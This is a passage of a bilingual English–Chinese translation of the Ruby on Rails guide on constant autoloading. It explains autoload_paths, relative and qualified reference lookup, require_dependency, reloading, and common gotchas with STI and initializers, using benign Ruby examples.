    If the lookup fails, const_missing is invoked in the parent. The default implementation of const_missing raises NameError, but it can be overridden.
    如果查找失败，父类会调用const_missing。const_missing默认执行是抛出NameError，但这个执行可以被改写。

As you see, this algorithm is simpler than the one for relative constants. In particular, the nesting plays no role here, and modules are not special-cased, if neither they nor their ancestors have the constants, Object is not checked.
正如所见，它的运算比相对常量更简便。特别的是，嵌套在这里没有起作用，模块也不例外，如果它和超类两者都没找到该常量，Object不会被检查。

Rails autoloading does not emulate this algorithm, but its starting point is the name of the constant to be autoloaded, and the parent. See more in Qualified References.
Rails自动加载不会模拟这一运算，但它的起点是要自动加载的常量的名称和它的超类。详见下面的限定引用。
##  3 Vocabulary 词汇表
###  3.1 Parent Namespaces 父层命名空间

Given a string with a constant path we define its parent namespace to be the string that results from removing its rightmost segment.
对于用一个常量路径给出的一个字符串，我们定义它的父层命名空间为被移除了右边部分的字符串。

For example, the parent namespace of the string "A::B::C" is the string "A::B", the parent namespace of "A::B" is "A", and the parent namespace of "A" is "".
比如，字符串"A::B::C"的父层命名空间是"A::B"， "A::B"的父层命名空间是"A"，而 "A"的父层命名空间是""。

The interpretation of a parent namespace when thinking about classes and modules is tricky though. Let's consider a module M named "A::B":
考虑到类和模块时，父层命名空间的解释就有些麻烦了。下面想想一个叫做"A::B"的模块M。

    The parent namespace, "A", may not reflect nesting at a given spot.
    父层命名空间 "A"，在指定点上可能没有反映嵌套。

    The constant A may no longer exist, some code could have removed it from Object.
    常量A不再存在，一些代码从Object里被移除了。

    If A exists, the class or module that was originally in A may not be there anymore. For example, if after a constant removal there was another constant assignment there would generally be a different object in there.
    如果A还存在，原来在A里的类和模块可能不再存在。比如，如果移除了一个常量，又分配了另一个常量，常量里的对象一般不会相同。

    In such case, it could even happen that the reassigned A held a new class or module called also "A"!
    这种情况下，有可能出现重新分配A ，但这个A里保存了新的类或模块。

    In the previous scenarios M would no longer be reachable through A::B but the module object itself could still be alive somewhere and its name would still be "A::B".
    在前面的情况下，M不能再通过A::B找到，但模块对象自身仍然存在，名称也依然是“A::B”。

The idea of a parent namespace is at the core of the autoloading algorithms and helps explain and understand their motivation intuitively, but as you see that metaphor leaks easily. Given an edge case to reason about, take always into account that by "parent namespace" the guide means exactly that specific string derivation.
父层命名空间的理念位于自动加载运算的中心，它有助于解释和理解它们的直接动机；但正如所见，这很容易出错。考虑到极端情况，要重视通过父层命名空间分析特定字符串原本的意思。
###  3.2 Loading Mechanism 加载机制

Rails autoloads files with Kernel#load when config.cache_classes is false, the default in development mode, and with Kernel#require otherwise, the default in production mode.
当处于开发模式时，即config.cache_classes为false时，Rails用Kernel#load自动加载文件；而处于生产模式时，使用Kernel#require或其他自动加载机制。

Kernel#load allows Rails to execute files more than once if constant reloading is enabled.
如果启动常量重载功能，Kernel#load允许Rails多次执行文件。

This guide uses the word "load" freely to mean a given file is interpreted, but the actual mechanism can be Kernel#load or Kernel#require depending on that flag.
本指南使用的词汇“加载”意义较为宽松，意思是给定文件被解释器所解释，但实际机制可能是Kernel#load或Kernel#require，选择哪个则依赖于该设置的标志。
##  4 Autoloading Availability 自动加载效应

Rails is always able to autoload provided its environment is in place. For example the runner command autoloads:
Rails总能够自动加载位于适当位置的环境。比如，运行器命令会自动加载。
$ bin/rails runner 'p User.column_names'
["id", "email", "created_at", "updated_at"]

The console autoloads, the test suite autoloads, and of course the application autoloads.
控制台自动加载、测试套件自动加载，当然程序也能自动加载。

By default, Rails eager loads the application files when it boots in production mode, so most of the autoloading going on in development does not happen. But autoloading may still be triggered during eager loading.
默认情况下，Rails在生产模式下启动时会贪婪加载程序文件，所以发生于开发模式下的大部分自动加载不会出现。但在贪婪加载期间，自动加载仍可能会被除法。

For example, given
比如，下面：
class BeachHouse < House
end

if House is still unknown when app/models/beach_house.rb is being eager loaded, Rails autoloads it.
当app/models/beach_house.rb被贪婪加载时，如果House仍然未知，Rails会自动加载它。
##  5 autoload_paths 自动加载路径

As you probably know, when require gets a relative file name:
你可能知道，require得到一个相对文件名时:
require 'erb'

Ruby looks for the file in the directories listed in $LOAD_PATH. That is, Ruby iterates over all its directories and for each one of them checks whether they have a file called "erb.rb", or "erb.so", or "erb.o", or "erb.dll". If it finds any of them, the interpreter loads it and ends the search. Otherwise, it tries again in the next directory of the list. If the list gets exhausted, LoadError is raised.
Ruby在$LOAD_PATH变量所列出的目录下寻找文件。就是，Ruby迭代所有这个目录，并为每一个检查是否有叫做“erb.rb”或者“erb.so”，或者“erb.o”，或者“erb.dll”的文件。如果找到任何一个文件，解释器会加载它，终止搜索。否则，它会在清单的下一个目录中尝试。如果找过了清单的所有目录，则抛出LoadError异常。

We are going to cover how constant autoloading works in more detail later, but the idea is that when a constant like Post is hit and missing, if there's a post.rb file for example in app/models Rails is going to find it, evaluate it, and have Post defined as a side-effect.
我们要知道常量怎么自动加载工作的更多细节，但理念却是，当一个像Post的常量被找到，并遗失，如果有个post.rb文件存在，比如说在app/models，Rails将会找到它，并进行求值，顺便定义了Post。

Alright, Rails has a collection of directories similar to $LOAD_PATH in which to look up post.rb. That collection is called autoload_paths and by default it contains:
对了，Rails有一个类似$LOAD_PATH目录的集合，该目录里可以找到post.rb。该集合被称为自动加载路径，默认情况下包含了：

    All subdirectories of app in the application and engines. For example, app/controllers. They do not need to be the default ones, any custom directories like app/workers belong automatically to autoload_paths.
    在程序和引擎里的app所有的子目录。比如，控制器目录。不一定是默认的，任何自定义的目录，比如app/worders都会被自动归结到autoload_paths。

    Any existing second level directories called app/*/concerns in the application and engines.
    在程序和引擎里任何已存的第二层级的目录叫做 app/*/concerns。「译注：called应该译为“比如”吗？」

    The directory test/mailers/previews.
    test/mailers/previews目录。

Also, this collection is configurable via config.autoload_paths. For example, lib was in the list years ago, but no longer is. An application can opt-in by adding this to config/application.rb:
这个集合也可以通过config.autoload_paths来配置。比如，以前lib是在这个清单中的，但现在已经不是。程序可以将下面一行添加到里面，从而把它加入清单中。
config.autoload_paths += "#{Rails.root}/lib"

The value of autoload_paths can be inspected. In a just generated application it is (edited):
自动加载路径的值可以被显示出来了。在一个已经生成的程序中，它的值是：
$ bin/rails r 'puts ActiveSupport::Dependencies.autoload_paths'
.../app/assets
.../app/controllers
.../app/helpers
.../app/mailers
.../app/models
.../app/controllers/concerns
.../app/models/concerns
.../test/mailers/previews

autoload_paths is computed and cached during the initialization process. The application needs to be restarted to reflect any changes in the directory structure.
自动加载路径在初始化过程期间被计算出来并缓存起来。该目录结构出现任何变化都需要程序重启来表现这些变化。
##  6 Autoloading Algorithms 自动加载运算
###  6.1 Relative References 相对引用

A relative constant reference may appear in several places, for example, in
相对的常量引用可能出现在几个地方，比如在：
class PostsController < ApplicationController
  def index
    @posts = Post.all
  end
end

all three constant references are relative.
所有三个常量引用都是相对的。
####  6.1.1 Constants after the class and module Keywords 关键字class和module后面的常量

Ruby performs a lookup for the constant that follows a class or module keyword because it needs to know if the class or module is going to be created or reopened.
Ruby为关键字class或module后面的常量进行查找，因为它需要知道是否有类或模块正在被创建或重新打开。

If the constant is not defined at that point it is not considered to be a missing constant, autoloading is not triggered.
如果常量没有定义在该点上，那它还没被视作丢失的常量，还不会触发自动加载。

So, in the previous example, if PostsController is not defined when the file is interpreted Rails autoloading is not going to be triggered, Ruby will just define the controller.
因此，前面的例子中，在文件被解释完而Rails的自动加载还没有被触发的时候，如果PostsController没有被定义，Ruby会只定义控制器。
####  6.1.2 Top-Level Constants 顶级常量

On the contrary, if ApplicationController is unknown, the constant is considered missing and an autoload is going to be attempted by Rails.
相反，如果 ApplicationController未知，常量被认为丢失，自动加载就会被Rails启动起来尝试。

In order to load ApplicationController, Rails iterates over autoload_paths. First checks if app/assets/application_controller.rb exists. If it does not, which is normally the case, it continues and finds app/controllers/application_controller.rb.
为了加载ApplicationController，Rails将迭代autoload_paths。首先寻找app/assets/application_controller.rb是否存在。如果不存在，正常情况下会继续寻找，找到app/controllers/application_controller.rb。

If the file defines the constant ApplicationController all is fine, otherwise LoadError is raised:
如果文件定义了常量ApplicationController，则万事大吉；否则就抛出LoadError异常：
unable to autoload constant ApplicationController, expected
<full path to application_controller.rb> to define it (LoadError)

Rails does not require the value of autoloaded constants to be a class or module object. For example, if the file app/models/max_clients.rb defines MAX_CLIENTS = 100 autoloading MAX_CLIENTS works just fine.
Rails不要求自动加载的常量的值是一个类或模块对象。比如，如果文件app/models/max_clients.rb定义了MAX_CLIENTS = 100，则自动加载MAX_CLIENTS就好了。
####  6.1.3 Namespaces  命名空间

Autoloading ApplicationController looks directly under the directories of autoload_paths because the nesting in that spot is empty. The situation of Post is different, the nesting in that line is [PostsController] and support for namespaces comes into play.
自动加载ApplicationController看起来直接在自动加载路径的目录之下，因为该点的嵌套是空的。Post的情况则不同，该行的嵌套是[PostsController]，支持命名空间的作用。

The basic idea is that given
基本理念是，
module Admin
  class BaseController < ApplicationController
    @@all_roles = Role.all
  end
end

to autoload Role we are going to check if it is defined in the current or parent namespaces, one at a time. So, conceptually we want to try to autoload any of
要自动加载Role，则需要检查它是否定义在当前或父层命名空间里，一个时间里只检查一个。那么，从概念上说，我们要按顺序尝试自动加载下面三层：

Admin::BaseController::Role
Admin::Role
Role

in that order. That's the idea. To do so, Rails looks in autoload_paths respectively for file names like these:
理念就是这样。为了做到这点，Rails在自动加载路径中寻找三个文件，名称分别是：
admin/base_controller/role.rb
admin/role.rb
role.rb

modulus some additional directory lookups we are going to cover soon.
另外的一些目录，我们马上就要去找了。

'Constant::Name'.underscore gives the relative path without extension of the file name where Constant::Name is expected to be defined.
代码'Constant::Name'.underscore会给出相对路径，无需文件名的扩展，该路径是Constant::Name被定义的地方。

Let's see how Rails autoloads the Post constant in the PostsController above assuming the application has a Post model defined in app/models/post.rb.
假定程序有一个Post模型定义在app/models/post.rb里，现在看看Rails怎么自动加载上面的PostsController里的Post常量。

First it checks for posts_controller/post.rb in autoload_paths:
首先检查自动加载路径的posts_controller/post.rb，然后检查：
app/assets/posts_controller/post.rb
app/controllers/posts_controller/post.rb
app/helpers/posts_controller/post.rb
...
test/mailers/previews/posts_controller/post.rb

Since the lookup is exhausted without success, a similar search for a directory is performed, we are going to see why in the next section:
一旦查找失败终止，执行类似的目录搜索——我们在下一节的自动模块中看看为什么要这么做：
app/assets/posts_controller/post
app/controllers/posts_controller/post
app/helpers/posts_controller/post
...
test/mailers/previews/posts_controller/post

If all those attempts fail, then Rails starts the lookup again in the parent namespace. In this case only the top-level remains:
如果所有这些尝试都失败了，Rails将在父层开始再度查找。这时就只剩下顶层的了。
app/assets/post.rb
app/controllers/post.rb
app/helpers/post.rb
app/mailers/post.rb
app/models/post.rb

A matching file is found in app/models/post.rb. The lookup stops there and the file is loaded. If the file actually defines Post all is fine, otherwise LoadError is raised.
匹配的文件在中app/models/post.rb被找到。于是查找停止，加载文件。如果文件确实定义了Post，则万事大吉；否则就抛出LoadError异常：
###  6.2 Qualified References 限定引用

When a qualified constant is missing Rails does not look for it in the parent namespaces. But there is a caveat: When a constant is missing, Rails is unable to tell if the trigger was a relative reference or a qualified one.
限定常量丢失时，Rails不会在父层命名空间中寻找。但会出现一个警告：常量丢失时，Rails不能分辨出该触发器是一个相对引用还是一个限定引用。

For example, consider
比如，想想：
module Admin
  User
end

and
和
Admin::User

If User is missing, in either case all Rails knows is that a constant called "User" was missing in a module called "Admin".
如果User丢失了，这两种情况里，Rails知道的都只是一个叫做‘User’的常量在一个叫做“Admin”的模块中丢失了。

If there is a top-level User Ruby would resolve it in the former example, but wouldn't in the latter. In general, Rails does not emulate the Ruby constant resolution algorithms, but in this case it tries using the following heuristic:
如果有一个顶级的User，Ruby就可以解析出它在前一个例子中，不是在后一个例子中。一般，Rails不会模拟Ruby常量的解析运算，但在这个情况下它会尝试使用下面的提示：

    If none of the parent namespaces of the class or module has the missing constant then Rails assumes the reference is relative. Otherwise qualified.
    如果没有类或模块的父层命名空间丢失了常量，Rails会假定是相对引用，否则是限定引用。

For example, if this code triggers autoloading
比如，如果这个代码触发器自动加载了
Admin::User

and the User constant is already present in Object, it is not possible that the situation is
而User常量已经在Object里存在，就不可能是下面的这种情形：
module Admin
  User
end

because otherwise Ruby would have resolved User and no autoloading would have been triggered in the first place. Thus, Rails assumes a qualified reference and considers the file admin/user.rb and directory admin/user to be the only valid options.
因为如果不是这样，Ruby会解析User，并且在第一个位置里不会触发自动加载。因此，Rails假定是一个限定引用，并认为admin/user.rb文件和admin/user目录是唯一有效的选项。

In practice, this works quite well as long as the nesting matches all parent namespaces respectively and the constants that make the rule apply are known at that time.
实践中，这种方式运行良好，只要嵌套匹配所有对应的命名空间，在那时，使规则应用的常量就被识别出来了。

However, autoloading happens on demand. If by chance the top-level User was not yet loaded, then Rails assumes a relative reference by contract.
不过，自动加载在有请求时才会发生。如果顶级User偶然没有被加载，Rails会根据约定假定它是一个相对引用。

Naming conflicts of this kind are rare in practice, but if one occurs, require_dependency provides a solution by ensuring that the constant needed to trigger the heuristic is defined in the conflicting place.
实践中这种类型的命名冲突是很罕见的，但一旦发生，请求依赖会提供一个解决方案，它确保在冲突里需要触发提示的常量已被定义。
###  6.3 Automatic Modules 自动模块

When a module acts as a namespace, Rails does not require the application to defines a file for it, a directory matching the namespace is enough.
当模块作为一个命名空间，Rails不会要求程序为它定义一个文件，一个匹配命名空间的目录就足够了。

Suppose an application has a back office whose controllers are stored in app/controllers/admin. If the Admin module is not yet loaded when Admin::UsersController is hit, Rails needs first to autoload the constant Admin.
假定程序有一个后勤部门，它的控制器保存在app/controllers/admin里。如果Admin::UsersController已经出现，而Admin模块还没有加载，Rails需要首先加载常量Admin。

If autoload_paths has a file called admin.rb Rails is going to load that one, but if there's no such file and a directory called admin is found, Rails creates an empty module and assigns it to the Admin constant on the fly.
如果加载路径有一个叫做admin.rb的文件，Rails将会加载那个文件，但如果没有这样一个文件，而找到一个叫admin的目录，Rails将会创建一个空的模块，会分配它到一个空闲的Admin常量中。
###  6.4 Generic Procedure 一般流程

Relative references are reported to be missing in the cref where they were hit, and qualified references are reported to be missing in their parent. (See Resolution Algorithm for Relative Constants at the beginning of this guide for the definition of cref, and Resolution Algorithm for Qualified Constants for the definition of parent.)
在cref中，相对引用在出现的地方被报告为丢失，而限定引用在父层被报告为丢失。（参见上面本指南的开始处《相对常量的解析运算》一节中cref的定义，以及《限定常量》一节中定义的parent）。

The procedure to autoload constant C in an arbitrary situation is as follows:
在任何情况下，常量C的自动加载过程都是如下所示：
if the class or module in which C is missing is Object
# 如果丢失C的类或模块是Object，
  let ns = ''
# 命名空间为空
else
  let M = the class or module in which C is missing
  # 将丢失C的类或模块赋值到M中
  if M is anonymous
# 如果 M 没有名称
    let ns = ''
  else
    let ns = M.name
  end
end
 
loop do
# 进入循环

  # Look for a regular file.
# 在自动查找路径里查找普通文件
  for dir in autoload_paths
    if the file "#{dir}/#{ns.underscore}/c.rb" exists
# 如果"#{dir}/#{ns.underscore}/c.rb"文件存在
      load/require "#{dir}/#{ns.underscore}/c.rb"
  # 加载/请求该文件
      if C is now defined
# 如果C在里面被定义了
        return
# 返回该定义
      else
        raise LoadError
# 抛出 LoadError
      end
    end
  end
 
  # Look for an automatic module.
# 在自动查找路径里查找自动模块
  for dir in autoload_paths
    if the directory "#{dir}/#{ns.underscore}/c" exists
# 如果"#{dir}/#{ns.underscore}/c.rb"文件存在
      if ns is an empty string
# 如果ns为空字符串
        let C = Module.new in Object and return
      else
        let C = Module.new in ns.constantize and return
      end
    end
  end
 
  if ns is empty
    # We reached the top-level without finding the constant.
# 已经到达顶层，不用再寻找这个常量了。
    raise NameError
  else
# 还没到达顶层的时候
    if C exists in any of the parent namespaces
      # Qualified constants heuristic.
# 限定常量的提示
      raise NameError
    else
      # Try again in the parent namespace.
# 在父层命名空间里再次查找
      let ns = the parent namespace of ns and retry
    end
  end
end
##  7 require_dependency 请求依赖

Constant autoloading is triggered on demand and therefore code that uses a certain constant may have it already defined or may trigger an autoload. That depends on the execution path and it may vary between runs.
常量自动加载会按请求被除法，因此使用了特定常量的代码准备号定义或者触发一个自动加载。这取决于执行路径，并因运行而变化。

There are times, however, in which you want to make sure a certain constant is known when the execution reaches some code. require_dependency provides a way to load a file using the current loading mechanism, and keeping track of constants defined in that file as if they were autoloaded to have them reloaded as needed.
不过，有时执行一些代码时，想确保特定的常量被知道。请求依赖提供了一个方法来加载文件，它使用当前的加载机制，并跟踪定义在该文件中的常量，就好象它们是被自动加载到的、只在需要的时候重载。

require_dependency is rarely needed, but see a couple of use-cases in Autoloading and STI and When Constants aren't Triggered.
请求依赖真的少见。但下面就有一对用例，见下面的《自动加载和单表继承》和《常量没有被触发时》。

Unlike autoloading, require_dependency does not expect the file to define any particular constant. Exploiting this behavior would be a bad practice though, file and constant paths should match.
和自动加载不同，请求依赖不会期待文件定义任何特定常量。尽管使用这个行为是个糟糕的实践，不过真用的时候，文件和常量路径应该匹配。
##  8 Constant Reloading 常量重载

When config.cache_classes is false Rails is able to reload autoloaded constants.
config.cache_classes为false时，Rails允许重载已经自动加载的常量。

For example, in you're in a console session and edit some file behind the scenes, the code can be reloaded with the reload! command:
比如，如果在一个控制台会话里离开具体情景去编辑一些文件，代码可以用`reload!`命令重载。
> reload!

When the application runs, code is reloaded when something relevant to this logic changes. In order to do that, Rails monitors a number of things:
程序运行时，当某些逻辑相关的东西被改变时，代码会被重载。为了做到这一点，Rails监视下面的东西：

    config/routes.rb.
    路由

    Locales.
    本地化

    Ruby files under autoload_paths.
    自动加载路径下的Ruby文件

    db/schema.rb and db/structure.sql.
    db/schema.rb和db/structure.sql。

If anything in there changes, there is a middleware that detects it and reloads the code.
如果里面什么东西发生了变化，会有中间件侦测到这一点，并重载了代码。

Autoloading keeps track of autoloaded constants. Reloading is implemented by removing them all from their respective classes and modules using Module#remove_const. That way, when the code goes on, those constants are going to be unknown again, and files reloaded on demand.
自动加载会一直跟踪被自动加载的常量。重载则通过使用Module#removeJ_const方法将它们从相应的类和模块中全部移除来实现。那样，代码继续，那些常量会再次被遗忘，文件会按要求被重载。

This is an all-or-nothing operation, Rails does not attempt to reload only what changed since dependencies between classes makes that really tricky. Instead, everything is wiped.
这是一个要么全部有要么全部没有的操作，Rails不会尝试只重载改变的部分，因为类之间的依赖让这个过程变得巧妙，相反，它会擦去所有一切。
##  9 Module#autoload isn't Involved 模块的自动加载方法不是调用

Module#autoload provides a lazy way to load constants that is fully integrated with the Ruby constant lookup algorithms, dynamic constant API, etc. It is quite transparent.
Module#autoload提供了一个惰性的方式来加载常量，这个方式是和Ruby常量的查找运算、动态常量API等完全集成在一起的。这是很明显的。

Rails internals make extensive use of it to defer as much work as possible from the boot process. But constant autoloading in Rails is not implemented with Module#autoload.
Rails内部让这一过程获得巨大的应用，它会在启动过程中推迟尽可能多的工作。但Rails里的常量自动加载并不是靠Module#autoload实现的。

One possible implementation based on Module#autoload would be to walk the application tree and issue autoload calls that map existing file names to their conventional constant name.
一个可能的基于的实现可能是查看程序树，发出自动加载调用，将已有文件名称映射到它们惯例化的常量名称来。

There are a number of reasons that prevent Rails from using that implementation.
有许多理由阻止Rails使用那个实现。

For example, Module#autoload is only capable of loading files using require, so reloading would not be possible. Not only that, it uses an internal require which is not Kernel#require.
比如，Module#autoload只能使用请求来加载文件，所有重载是不可能的。不仅如此，它还使用一个内部的请求，而不是Kernel#require。

Then, it provides no way to remove declarations in case a file is deleted. If a constant gets removed with Module#remove_const its autoload is not triggered again. Also, it doesn't support qualified names, so files with namespaces should be interpreted during the walk tree to install their own autoload calls, but those files could have constant references not yet configured.
第二，它也没有提供文件被删除时移除声明的方法。如果一个常量被Module#remove_const移除了，自动加载不会被触发。同样，它也不支持限定名称，所以带有命名空间的名称会在查看文件树期间被解释出来，以便安装它们自身的自动加载调用，但是拥有常量引用的那些文件还没有被配置好。

An implementation based on Module#autoload would be awesome but, as you see, at least as of today it is not possible. Constant autoloading in Rails is implemented with Module#const_missing, and that's why it has its own contract, documented in this guide.
基于Module#autoload的实现将是可怕的，但如你所见，至少在今天它不可能这么实现。Rails里的常量自动加载是用Module#const_missing实现的，这就是为什么它拥有自己的规则记述在本指南里。
##  10 Common Gotchas 一般的收场
###  10.1 Nesting and Qualified Constants 嵌套和限定常量

Let's consider
看看
module Admin
  class UsersController < ApplicationController
    def index
      @users = User.all
    end
  end
end

and
和
class Admin::UsersController < ApplicationController
  def index
    @users = User.all
  end
end

To resolve User Ruby checks Admin in the former case, but it does not in the latter because it does not belong to the nesting. (See Nesting and Resolution Algorithms.)
为了解析User，在第一个例子中Ruby会检查Admin，但后一个例子里它不会，因为它不属于嵌套。（参见前面的《嵌套》和《解析运算》）

Unfortunately Rails autoloading does not know the nesting in the spot where the constant was missing and so it is not able to act as Ruby would. In particular, Admin::User will get autoloaded in either case.
不幸的是，Rails的自动加载不知道该点上的嵌套，该点上常量已经丢失，所以不能像Ruby那用运行起来。特别是Admin::User在两种情况下都将会自动加载。

Albeit qualified constants with class and module keywords may technically work with autoloading in some cases, it is preferable to use relative constants instead:
虽然带有class和module关键字的限定常量在某些情况下会技术上进行自动加载，但Rails更倾向于使用相对常量。
module Admin
  class UsersController < ApplicationController
    def index
      @users = User.all
    end
  end
end
###  10.2 Autoloading and STI  自动加载和单表继承

Single Table Inheritance (STI) is a feature of Active Record that enables storing a hierarchy of models in one single table. The API of such models is aware of the hierarchy and encapsulates some common needs. For example, given these classes:
单表继承是活性记录的一个特性，允许在单独一个数据表内存储一个层级。这样的模型的API知道层级，并压缩了一些共性需求。例如，下面这些类：
# app/models/polygon.rb
class Polygon < ActiveRecord::Base
end
 
# app/models/triangle.rb
class Triangle < Polygon
end
 
# app/models/rectangle.rb
class Rectangle < Polygon
end

Triangle.create creates a row that represents a triangle, and Rectangle.create creates a row that represents a rectangle. If id is the ID of an existing record, Polygon.find(id) returns an object of the correct type.
Triangle.create创建了一行表示一个三角形，Rectangle.create创建了一行表示一个矩形。如果id是已有数据的ID，Polygon.find(id)会返回一个正确的类型的对象。

Methods that operate on collections are also aware of the hierarchy. For example, Polygon.all returns all the records of the table, because all rectangles and triangles are polygons. Active Record takes care of returning instances of their corresponding class in the result set.
操作集合方法也知道层级。比如，Polygon.all返回数据表的所有记录，因为所有的矩形和三角形都是多边形。活性记录会处理好结果集合中对应类的实例的返回。

Types are autoloaded as needed. For example, if Polygon.first is a rectangle and Rectangle has not yet been loaded, Active Record autoloads it and the record is correctly instantiated.
类型会按需自动加载。比如，如果Polygon.first是个矩形，这时Rectangle还没被加载，活性记录会自动加载它，于是记录会被正确加载。

All good, but if instead of performing queries based on the root class we need to work on some subclass, things get interesting.
很好。但如果执行的查询不是基于根类，而是基于子类，那就有意思了。

While working with Polygon you do not need to be aware of all its descendants, because anything in the table is by definition a polygon, but when working with subclasses Active Record needs to be able to enumerate the types it is looking for. Let’s see an example.
用Polygon的时候，不需要知道它的子代，因为数据表的任何东西都被定义为polygon，但使用字类的时候，活性记录需要能够计算它所要查找的类型。下面看个例子。

Rectangle.all only loads rectangles by adding a type constraint to the query:
Rectangle.all在查询上增加一个类型约束，它只会加载矩形。
SELECT "polygons".* FROM "polygons"
WHERE "polygons"."type" IN ("Rectangle")

Let’s introduce now a subclass of Rectangle:
下面介绍一个矩形的子类。
# app/models/square.rb
class Square < Rectangle
end

Rectangle.all should now return rectangles and squares:
Rectangle.all会返回矩形和四边形。
SELECT "polygons".* FROM "polygons"
WHERE "polygons"."type" IN ("Rectangle", "Square")

But there’s a caveat here: How does Active Record know that the class Square exists at all?
但警告出现了：活性记录怎么直到Square类存在呢？

Even if the file app/models/square.rb exists and defines the Square class, if no code yet used that class, Rectangle.all issues the query
即使app/models/square.rb文件存在，且定义了Square类，如果没有代码使用该类，Rectangle.all会发出下面的查询：
SELECT "polygons".* FROM "polygons"
WHERE "polygons"."type" IN ("Rectangle")

That is not a bug, the query includes all known descendants of Rectangle.
这不是一个漏洞，查询包含了所有已知的四边形的子代。

A way to ensure this works correctly regardless of the order of execution is to load the leaves of the tree by hand at the bottom of the file that defines the root class:
确保这段代码运行起来、无需关注执行顺序的方式，是通过在该根类的定义文件底部手动加载该“树”的所有“枝叶”。
# app/models/polygon.rb
class Polygon < ActiveRecord::Base
end
require_dependency ‘square’

Only the leaves that are at least grandchildren need to be loaded this way. Direct subclasses do not need to be preloaded. If the hierarchy is deeper, intermediate classes will be autoloaded recursively from the bottom because their constant will appear in the class definitions as superclass.
只有隔了一代的“枝叶”需要按照这种方式加载。直接子类不需要这样预加载。如果层级更深，中间类将被在底部递归地自动加载进来，因为它们的常量会作为子类出现在类定义中。

###  10.3 Autoloading and require 自动加载和请求

Files defining constants to be autoloaded should never be required:
不应该请求定义了要被自动加载的常量的文件。
require 'user' # DO NOT DO THIS 别来这一句
 
class UsersController < ApplicationController
  ...
end

There are two possible gotchas here in development mode:
开发模式中有两种可能的结局：

    If User is autoloaded before reaching the require, app/models/user.rb runs again because load does not update $LOADED_FEATURES.
    如果User在到达请求语句之前被自动加载，app/models/user.rb会再次运行，因为加载不能更新$LOADED_FEATURES.

    If the require runs first Rails does not mark User as an autoloaded constant and changes to app/models/user.rb aren't reloaded.
    如果请求语句先运行，Rails会将User当作一个还未自动加载的常量，并且app/models/user.rb的改变将不会被重载。

Just follow the flow and use constant autoloading always, never mix autoloading and require. As a last resort, if some file absolutely needs to load a certain file use require_dependency to play nice with constant autoloading. This option is rarely needed in practice, though.
顺着流程，使用常量自动加载总是不会混入自动加载和请求。那就作为最后的手段，如果一些文件绝对需要使用require_dependency加载一个特定文件来和常量自动加载一起运行。尽管实现中这实在罕见。

Of course, using require in autoloaded files to load ordinary 3rd party libraries is fine, and Rails is able to distinguish their constants, they are not marked as autoloaded.
当然，在自动加载的文件里使用请求来加载普通的第三方库是很好的，Rails能够区分它们的常量，它们没有被标记为自动加载的。
###  10.4 Autoloading and Initializers  自动加载和启动器

Consider this assignment in config/initializers/set_auth_service.rb:
思考config/initializers/set_auth_service.rb里的这个分配：
AUTH_SERVICE = if Rails.env.production?
  RealAuthService
else
  MockedAuthService
end

The purpose of this setup would be that the application uses the class that corresponds to the environment via AUTH_SERVICE. In development mode MockedAuthService gets autoloaded when the initializer runs. Let’s suppose we do some requests, change its implementation, and hit the application again. To our surprise the changes are not reflected. Why?
这个设置的目的可能是，程序通过AUTH_SERVICE使用对应环境变量的类。在开发模式下，当启动器运行时，将自动加载MockedAuthService。假设我们做了些请求，改变了它的实现，再次请求程序。令人吃惊的是，改变并没有表现出来。为什么？

As we saw earlier, Rails removes autoloaded constants, but AUTH_SERVICE stores the original class object. Stale, non-reachable using the original constant, but perfectly functional.
正如在前面的《常量重载》一节所述，Rails会删除自动加载的常量，但AUTH_SERVICE保存了原始的类对象。旧的，不可达的使用原来的常量，但完全是功能性的。

The following code summarizes the situation:
下面的代码总结了这一情况：
class C
  def quack
    'quack!'
  end
end
 
X = C
Object.instance_eval { remove_const(:C) }
X.new.quack # => quack!
X.name      # => C
C           # => uninitialized constant C (NameError)

Because of that, it is not a good idea to autoload constants on application initialization.
正因为那样，在程序启动器中自动加载常量不是一个好主意。

In the case above we could implement a dynamic access point:
这种情况下，可以实现一个动态访问点：
# app/models/auth_service.rb
class AuthService
  if Rails.env.production?
    def self.instance
      RealAuthService
    end
  else
    def self.instance
      MockedAuthService
    end
  end
end

and have the application use AuthService.instance instead. AuthService would be loaded on demand and be autoload-friendly.
让程序使用AuthService.instance。AuthService会被按要求加载，并被友好地自动加载。
###  10.5 require_dependency and Initializers 请求依赖和启动器

As we saw before, require_dependency loads files in an autoloading-friendly way. Normally, though, such a call does not make sense in an initializer.
如前所见，请求依赖用一种友好的自动加载方式加载文件。但正常情况下，这样的一个调用不会对启动器有什么真正的影响。

One could think about doing some require_dependency calls in an initializer to make sure certain constants are loaded upfront, for example as an attempt to address the gotcha with STIs.
有一种方式能考虑在启动器中做到请求依赖调用、来确保特定常量是最先加载的，比如尝试用单表继承进行gotcha。

Problem is, in development mode autoloaded constants are wiped if there is any relevant change in the file system. If that happens then we are in the very same situation the initializer wanted to avoid!
问题是，在开发模式下如果在文件系统里存在相关改变，自动加载的常量将被清除。如果被清除，就陷入了启动器竭力避免的一种情况。

Calls to require_dependency have to be strategically written in autoloaded spots.
在已被自动加载的情况下，对请求依赖的调用必须从战略上说是写的。
###  10.6 When Constants aren't Missed 常量没有丢失时
10.6.1 Relative References 相对引用

Let's consider a flight simulator. The application has a default flight model
在看一下飞行模拟器。程序有一个默认的飞行模式：
# app/models/flight_model.rb
class FlightModel
end

that can be overridden by each airplane, for instance
该模式可以被每一架飞机（举个例子来说）改写。
# app/models/bell_x1/flight_model.rb
module BellX1
  class FlightModel < FlightModel
  end
end
 
# app/models/bell_x1/aircraft.rb
module BellX1
  class Aircraft
    def initialize
      @flight_model = FlightModel.new
    end
  end
end

The initializer wants to create a BellX1::FlightModel and nesting has BellX1, that looks good. But if the default flight model is loaded and the one for the Bell-X1 is not, the interpreter is able to resolve the top-level FlightModel and autoloading is thus not triggered for BellX1::FlightModel.
启动器想创建一个BellX1::FlightModel，嵌套中有BellX1，看起来不错。但如果默认飞行模式被加载，而Bell-X1没有，解释器能解析顶级的飞行模式，因此BellX1::FlightModel没有触发自动加载。

That code depends on the execution path.
那个代码取决于执行路径。

These kind of ambiguities can often be resolved using qualified constants:
这种不确定性经常会被使用限定常量来解析。
module BellX1
  class Plane
    def flight_model
      @flight_model ||= BellX1::FlightModel.new
    end
  end
end

Also, require_dependency is a solution:
同样，请求依赖是解决方法。
require_dependency 'bell_x1/flight_model'
 
module BellX1
  class Plane
    def flight_model
      @flight_model ||= FlightModel.new
    end
  end
end
10.6.2 Qualified References  限定引用

Given
给定
# app/models/hotel.rb
class Hotel
end
 
# app/models/image.rb
class Image
end
 
